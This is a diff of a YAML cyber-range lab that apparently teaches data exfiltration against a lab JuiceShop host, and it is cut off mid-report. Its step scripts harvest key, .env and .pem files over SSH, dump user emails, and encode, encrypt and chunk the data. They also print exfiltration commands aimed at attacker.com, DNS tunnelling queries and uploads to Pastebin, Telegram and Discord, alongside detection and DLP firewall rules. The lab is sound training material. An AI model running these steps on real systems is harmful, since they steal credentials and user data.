@@ -24,6 +24,7 @@ steps:
     type: output_contains
     expect: /
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'find /etc /home /var/www -type f \( -name "*.conf" -o -name "*.env" -o -name "*.key" -o -name "*.pem" -o -name "*.sql" \) 2>/dev/null
     | head -20' 2>/dev/null
   risk_level: low
@@ -39,6 +40,7 @@ steps:
     type: output_contains
     expect: Extracted users
     field: stdout
+  target_vm: attacker
   script: curl -s http://10.20.30.80:3000/api/Users | python3 -c "import sys,json; users=json.load(sys.stdin)['data']; [print(f\"{u['id']},{u['email']}\") for u in users]" > /tmp/exfil_users.csv && echo
     'Extracted users:' && wc -l /tmp/exfil_users.csv && head -5 /tmp/exfil_users.csv
   risk_level: medium
@@ -54,6 +56,7 @@ steps:
     type: output_contains
     expect: Original size
     field: stdout
+  target_vm: attacker
   script: base64 /tmp/exfil_users.csv > /tmp/exfil_encoded.txt && echo 'Original size:' && wc -c /tmp/exfil_users.csv && echo 'Encoded size:' && wc -c /tmp/exfil_encoded.txt && echo 'Preview:' && head -3
     /tmp/exfil_encoded.txt
   risk_level: medium
@@ -70,6 +73,7 @@ steps:
     type: output_contains
     expect: HTTP Exfiltration
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== HTTP Exfiltration Simulation ==='' && echo ''Method: curl -X POST -d @/tmp/exfil_encoded.txt http://attacker.com/collect'' && echo ''---'' && echo ''With headers disguise:'' && echo
     ''curl -X POST -H "Content-Type: application/json" -d "{\"log\":\"$(head -1 /tmp/exfil_encoded.txt)\"}" http://attacker.com/api/logs'' && echo ''---'' && echo ''HTTP exfil detected by: proxy logs, DLP,
     unusual POST sizes'''
@@ -86,6 +90,7 @@ steps:
     type: output_contains
     expect: DNS Tunneling
     field: stdout
+  target_vm: attacker
   script: 'DATA=''sensitive_data''; ENCODED=$(echo -n $DATA | xxd -p); echo ''=== DNS Tunneling Simulation ==='' && echo "Original: $DATA" && echo "Encoded: $ENCODED" && echo "DNS query: dig $ENCODED.exfil.attacker.com"
     && echo ''---'' && echo ''Real tools: iodine, dnscat2, DNSExfiltrator'' && echo ''Detection: unusually long DNS queries, high query volume to single domain'''
   risk_level: medium
@@ -101,6 +106,7 @@ steps:
     type: output_contains
     expect: ICMP Tunneling
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== ICMP Tunneling ==='' && echo ''Using ping -p to embed data in ICMP payload:'' && DATA_HEX=$(echo -n ''EXFIL'' | xxd -p) && echo "Data hex: $DATA_HEX" && ping -c 1 -p $DATA_HEX 10.20.30.80
     2>&1 | head -5 && echo ''---'' && echo ''Tools: icmpsh, ptunnel, icmptunnel'' && echo ''Detection: unusual ICMP packet sizes, high ICMP volume'''
   risk_level: medium
@@ -116,6 +122,7 @@ steps:
     type: output_contains
     expect: Encrypted file
     field: stdout
+  target_vm: attacker
   script: 'openssl enc -aes-256-cbc -salt -in /tmp/exfil_users.csv -out /tmp/exfil_encrypted.bin -pass pass:exfil_key_2026 -pbkdf2 2>/dev/null && echo ''Encrypted file:'' && file /tmp/exfil_encrypted.bin
     && ls -la /tmp/exfil_encrypted.bin && echo ''---'' && echo ''Decryption: openssl enc -d -aes-256-cbc -in exfil_encrypted.bin -pass pass:key -pbkdf2'''
   risk_level: medium
@@ -131,6 +138,7 @@ steps:
     type: output_contains
     expect: Chunks created
     field: stdout
+  target_vm: attacker
   script: split -b 50 /tmp/exfil_users.csv /tmp/chunk_ && echo 'Chunks created:' && ls -la /tmp/chunk_* && echo '---' && echo 'Low-and-slow exfil simulation:' && for f in /tmp/chunk_*; do echo "Sending
     $(basename $f) ($(wc -c < $f) bytes) at $(date +%H:%M:%S)"; done
   risk_level: medium
@@ -147,6 +155,7 @@ steps:
     type: output_contains
     expect: Steganography simulation
     field: stdout
+  target_vm: attacker
   script: 'echo ''SECRET_DATA:admin@juice-sh.op:password123'' > /tmp/secret.txt && dd if=/dev/urandom bs=1024 count=10 of=/tmp/fake_image.jpg 2>/dev/null && cat /tmp/fake_image.jpg /tmp/secret.txt > /tmp/stego_image.jpg
     && echo ''Steganography simulation:'' && echo ''Original: '' $(wc -c < /tmp/fake_image.jpg) ''bytes'' && echo ''With hidden data: '' $(wc -c < /tmp/stego_image.jpg) ''bytes'' && echo ''Extract: tail
     -c $(wc -c < /tmp/secret.txt) /tmp/stego_image.jpg'' && echo ''---'' && echo ''Real tools: steghide, openstego, snow'''
@@ -164,6 +173,7 @@ steps:
     type: output_contains
     expect: Cloud Service Exfiltration
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Cloud Service Exfiltration ==='' && echo ''Pastebin: curl -X POST -d "api_paste_code=$(cat /tmp/exfil_encoded.txt)" https://pastebin.com/api/api_post.php'' && echo ''Telegram: curl
     -F "document=@/tmp/exfil_encrypted.bin" https://api.telegram.org/bot<TOKEN>/sendDocument?chat_id=<ID>'' && echo ''Discord: curl -F "file=@/tmp/data.zip" https://discord.com/api/webhooks/<ID>'' && echo
     ''---'' && echo ''Detection: SSL inspection, domain reputation, upload volume monitoring'''
@@ -180,6 +190,7 @@ steps:
     type: output_contains
     expect: Archive created
     field: stdout
+  target_vm: attacker
   script: tar czf /tmp/exfil_archive.tar.gz /tmp/exfil_users.csv /tmp/exfil_encoded.txt 2>/dev/null && echo 'Archive created:' && ls -lh /tmp/exfil_archive.tar.gz && echo 'Original total:' && du -ch /tmp/exfil_users.csv
     /tmp/exfil_encoded.txt 2>/dev/null | tail -1 && echo 'Compression ratio achieved'
   risk_level: medium
@@ -196,6 +207,7 @@ steps:
     type: output_contains
     expect: Exfiltration Detection
     field: stdout
+  target_vm: attacker
   script: echo '=== Exfiltration Detection ===' && echo 'DNS tunneling detection:' && echo 'tcpdump -i any port 53 -nn -l | awk "{if(length>200) print \"SUSPICIOUS:\", \$0}"' && echo '---' && echo 'HTTP
     exfil detection:' && echo 'tcpdump -i any port 80 or port 443 -nn -c 10 -q' && echo '---' && echo 'ICMP exfil detection:' && echo 'tcpdump -i any icmp -nn -l | awk "{if(length>100) print \"LARGE ICMP:\",
     \$0}"' && echo '---' && sudo tcpdump -c 3 -i any port 53 -nn 2>&1 | head -5
@@ -212,6 +224,7 @@ steps:
     type: output_contains
     expect: Hex encoded
     field: stdout
+  target_vm: attacker
   script: echo 'admin:password123' | xxd -p > /tmp/hex_exfil.txt && echo 'Hex encoded:' && cat /tmp/hex_exfil.txt && echo 'Decoded:' && xxd -r -p /tmp/hex_exfil.txt && echo '---' && echo 'Hex encoding is
     useful for embedding data in URLs, cookies, and headers'
   risk_level: medium
@@ -228,6 +241,7 @@ steps:
     type: output_contains
     expect: DLP Firewall Rules
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== DLP Firewall Rules (nftables) ===\n\n# Rate limit outbound connections\nadd rule inet filter output tcp dport {80, 443} ct state new limit rate 10/minute burst 20 accept\nadd rule
     inet filter output tcp dport {80, 443} ct state new drop\n\n# Block DNS to non-approved servers\nadd rule inet filter output udp dport 53 ip daddr != 10.20.30.1 drop\n\n# Log large outbound transfers\nadd
     rule inet filter output ct bytes > 10485760 log prefix "LARGE_TRANSFER: " accept\n\n# Block ICMP with large payload\nadd rule inet filter output icmp type echo-request meta length > 100 drop'''
@@ -246,6 +260,7 @@ steps:
     type: output_contains
     expect: Data Exfiltration Report
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Data Exfiltration Report ===\n\n[Data Collected]\n- User credentials from JuiceShop API\n- Configuration files from web server\n\n[Exfiltration Channels]\n1. HTTP POST: Easy, blends
     with normal traffic\n2. DNS Tunneling: Bypasses most firewalls\n3. ICMP Tunneling: Often overlooked\n4. Cloud Services: HTTPS encrypted\n5. Steganography: Hidden in media files\n\n[Evasion Techniques]\n-
     Encryption (AES-256)\n- Encoding (Base64, Hex)\n- Chunking (Low-and-Slow)\n- Compression (tar.gz)\n\n[Detection/Prevention]\n1. DLP solution with SSL inspection\n2. DNS monitoring (query length, volume)\n3.
